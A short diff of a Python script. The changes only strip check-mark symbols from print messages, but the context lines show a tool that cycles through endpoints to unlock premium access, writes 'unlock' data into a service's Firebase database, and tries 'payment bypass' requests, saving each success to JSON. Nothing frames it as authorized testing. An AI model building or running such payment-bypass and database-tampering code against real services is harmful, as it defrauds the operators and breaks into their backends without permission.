@@ -90,7 +90,7 @@ for attempt in endpoints_to_try:
             try:
                 resp = r.json()
                 if resp.get('status'):
-                    print(f"  ✓✓✓ SUCCESS! Premium access granted!")
+                    print(f"   SUCCESS! Premium access granted!")
                     with open(output / "premium_access_success.json", "w") as f:
                         json.dump(resp, f, indent=2)
                     break
@@ -126,13 +126,13 @@ for path in firebase_paths:
         print(f"  Status: {r.status_code}")
         
         if r.status_code == 200:
-            print(f"  ✓✓✓ Firebase write successful!")
+            print(f"   Firebase write successful!")
             print(f"  Data written: {unlock_data}")
             
             with open(output / "firebase_unlock.json", "w") as f:
                 json.dump(unlock_data, f, indent=2)
         else:
-            print(f"  ✗ Write blocked")
+            print(f"   Write blocked")
         print()
     except Exception as e:
         print(f"  Error: {e}")
@@ -181,7 +181,7 @@ for attempt in payment_endpoints:
             try:
                 resp = r.json()
                 if resp.get('status'):
-                    print(f"  ✓✓✓ Payment bypass successful!")
+                    print(f"   Payment bypass successful!")
                     with open(output / "payment_bypass_success.json", "w") as f:
                         json.dump(resp, f, indent=2)
             except:
